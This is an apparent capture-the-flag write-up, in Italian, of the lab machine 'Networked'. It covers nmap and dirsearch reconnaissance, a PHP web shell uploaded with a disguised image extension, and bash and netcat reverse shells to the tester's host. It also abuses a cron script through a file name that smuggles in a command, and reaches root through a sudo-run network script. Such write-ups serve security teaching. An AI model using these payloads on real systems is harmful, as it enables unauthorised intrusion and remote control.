# Networked

## Reconnaissance

Per prima cosa eseguo una scansione iniziale con nmap.

```text
sudo nmap -sC -sV -O -oA /usr/share/nmap/initial 10.10.10.146
```

* **-sC**: scipt nmap di default
* **-sV**: per rilevare la versione dei servizi
* **-O**: per rilevare il SO
* **-oA**: per stampare tutti i formati e salvarli nel file _nmap/initial_

Il risultato della scansione è il seguente:

```text
Nmap scan report for 10.10.10.146
Host is up (0.046s latency).
Not shown: 985 filtered tcp ports (no-response), 12 filtered tcp ports (host-prohibited)
PORT    STATE  SERVICE VERSION
22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
443/tcp closed https
Aggressive OS guesses: Linux 3.10 - 4.11 (94%), Linux 5.1 (92%), Linux 3.18 (91%), Linux 3.2 - 4.9 (91%), Linux 3.13 (90%), Linux 3.13 or 4.2 (90%), Linux 4.10 (90%), Linux 4.2 (90%), Linux 4.4 (90%), Asus RT-AC66U WAP (90%)
No exact OS matches for host (test conditions non-ideal).

```

## Enumeration

Visito la pagina http://10.10.10.146/:

<p align="center">
  <img src="/Immagini/Linux-Box/Networked/networked-1.png" />
</p>

Nulla di troppo interessante.

Utilizzo il comando _dirsearch_:

```text
dirsearch -u http://10.10.10.146/
```

E ottengo il seguente risultato:

```text
[04:27:52] Starting:
[04:27:56] 403 -  216B  - /.htaccess.orig
[04:27:56] 403 -  218B  - /.htaccess.sample
[04:27:56] 403 -  217B  - /.htaccess_extra
[04:27:56] 403 -  214B  - /.htaccessBAK
[04:27:56] 403 -  214B  - /.htaccess_sc
[04:27:56] 403 -  216B  - /.htaccess.save
[04:27:56] 403 -  216B  - /.htaccess.bak1
[04:27:56] 403 -  216B  - /.htaccess_orig
[04:27:56] 403 -  214B  - /.htaccessOLD
[04:27:56] 403 -  206B  - /.htm
[04:27:56] 403 -  207B  - /.html
[04:27:56] 403 -  213B  - /.httr-oauth
[04:27:56] 403 -  212B  - /.htpasswds
[04:27:56] 403 -  216B  - /.htpasswd_test
[04:27:56] 403 -  213B  - /.ht_wsr.txt
[04:27:56] 403 -  215B  - /.htaccessOLD2
[04:28:18] 301 -  235B  - /backup  ->  http://10.10.10.146/backup/
[04:28:18] 200 -  885B  - /backup/
[04:28:21] 403 -  210B  - /cgi-bin/
[04:28:33] 200 -  229B  - /index.php
[04:28:33] 200 -  229B  - /index.php/login/
[04:28:46] 200 -    1KB - /photos.php
[04:29:04] 200 -  169B  - /upload.php
[04:29:04] 301 -  236B  - /uploads  ->  http://10.10.10.146/uploads/
[04:29:05] 200 -    2B  - /uploads/
```

Dal risultato capisco che, molto probabilmente, il miglior modo di proseguire è quello di tentare un _File Upload Attack_.

## Exploitation

Dopo aver navigato tra le pagine precedentemente scoperte provo a caricare un file sulla pagina http://10.10.10.146/upload.php/ e intercetto la richiesta tramite burp:

<p align="center">
  <img src="/Immagini/Linux-Box/Networked/networked-2.png" />
</p>

Invio la richiesta al Repeater e la modifico nel seguente modo:

```text
POST /upload.php HTTP/1.1
Host: 10.10.10.146
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------109821639018132880122530346327
Content-Length: 380
Origin: http://10.10.10.146
Connection: close
Upgrade-Insecure-Requests: 1

-----------------------------109821639018132880122530346327

Content-Disposition: form-data; name="myFile"; filename="test.php.png"
Content-Type: image/png

GIF89a;
<?php system($_GET[c]);?>

-----------------------------109821639018132880122530346327

Content-Disposition: form-data; name="submit"

go!

-----------------------------109821639018132880122530346327--
```

Invio la richiesta e visito il seguente indirizzo http://10.10.10.146/uploads/10_10_14_7.php.png?c=whoami:

<p align="center">
  <img src="/Immagini/Linux-Box/Networked/networked-3.png" />
</p>

**Funziona!**

Ora devo provare ad ottenere una shell.

Avvio quindi un listener sulla porta 1234 e invio una richiesta contentente il seguente comando:

```text
"bash -c 'bash -i >& /dev/tcp/10.10.14.7/1234 0>&1'"
```

```text
http://10.10.10.146/uploads/10_10_14_7.php.png?c=bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.7/1234+0>%261'
```

In questo modo ottengo una shell:

<p align="center">
  <img src="/Immagini/Linux-Box/Networked/networked-4.png" />
</p>

Eseguo l'upgrade della shell con il seguente comando:

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

Purtroppo l'utente attuale (_apache_) non possiede il primo flag.


## Privilege Escalation

Navigando tra le directory trovo quella dell'utente _guly_:

```text
drwxr-xr-x. 2 guly guly 4096 Sep  6  2022 .
drwxr-xr-x. 3 root root   18 Jul  2  2019 ..
lrwxrwxrwx. 1 root root    9 Sep  7  2022 .bash_history -> /dev/null
-rw-r--r--. 1 guly guly   18 Oct 30  2018 .bash_logout
-rw-r--r--. 1 guly guly  193 Oct 30  2018 .bash_profile
-rw-r--r--. 1 guly guly  231 Oct 30  2018 .bashrc
-r--r--r--. 1 root root  782 Oct 30  2018 check_attack.php
-rw-r--r--  1 root root   44 Oct 30  2018 crontab.guly
-r--------. 1 guly guly   33 Nov  9 10:18 user.txt
```

Ispeziono il contenuto del file _corntab.guly_:

```text
cat crontab.guly
*/3 * * * * php /home/guly/check_attack.php
```

Scopro che il file _check_attack.php_ viene eseguito ogni 3 minuti e quindi mi focalizzo su di esso.

Questo è il contenuto del file:

```text
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
```

Lo script prende tutti i file in _/var/www/html/uploads_ ed esegue le funzioni _getnameCheck()_ e _check_ip()_ della libreria _lib.php_:

```text
<?php

function getnameCheck($filename) {
  $pieces = explode('.',$filename);
  $name= array_shift($pieces);
  $name = str_replace('_','.',$name);
  $ext = implode('.',$pieces);
  #echo "name $name - ext $ext\n";
  return array($name,$ext);
}

...
...

function check_ip($prefix,$filename) {
  //echo "prefix: $prefix - fname: $filename<br>\n";
  $ret = true;
  if (!(filter_var($prefix, FILTER_VALIDATE_IP))) {
    $ret = false;
    $msg = "4tt4ck on file ".$filename.": prefix is not a valid ip ";
  } else {
    $msg = $filename;
  }
  return array($ret,$msg);
}

...
...

?>
```

La funzione _getnameCheck()_ è molto semplice in quanto separa il nome del file dalla sua estensione, mentre la funzione _check_ip()_ controlla la validità del filename e se non è valido ritorna false e viene triggerato il componente attack nel file _check_attack.php_. In questo caso viene passato il path del file alla funzione _exec()_ che, per mia fortuna, non prevede alcun controllo sulla validità dell'input.

Quindi mi sposto sulla cartella /var/www/html/uploads e creo il seguente file:

```text
touch '; nc -c bash 10.10.14.7 4444'
```

Successivamente, avvio un listener sulla porta 4444 e aspetto l'esecuzione del cron job:

<p align="center">
  <img src="/Immagini/Linux-Box/Networked/networked-5.png" />
</p>

**Ottengo così una shell per l'utente guly e ricavo il primo flag!**

Come prima cosa eseguo il comando:

```text
sudo -l
```

Il risultato è il seguente:

```text
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

Purtroppo non posso modificare il contenuto del file, ma solo eseguirlo e leggerlo. All'interno trovo questo:

```text
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done

/sbin/ifup guly0
```

Il file (sul quale ho i permessi solo in lettura) fa un semplice controllo regex sul contenuto del file _/etc/sysconfig/network-scripts/ifcfg-guly_:

```text
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
NAME=ps /tmp/foo
PROXY_METHOD=asodih
BROWSER_ONLY=asdoih
BOOTPROTO=asdoih
```

Facendo una rapida ricerca trovo questo [bug report](https://bugzilla.redhat.com/show_bug.cgi?id=1697473) e scopro che un filtraggio errato degli spazi bianchi sull'attributo NAME porta all'esecuzione di codice. Eseguo quindi il  file _changename.sh_ con privilegi sudo e procedo così:

<p align="center">
  <img src="/Immagini/Linux-Box/Networked/networked-6.png" />
</p>

**Sono root!**
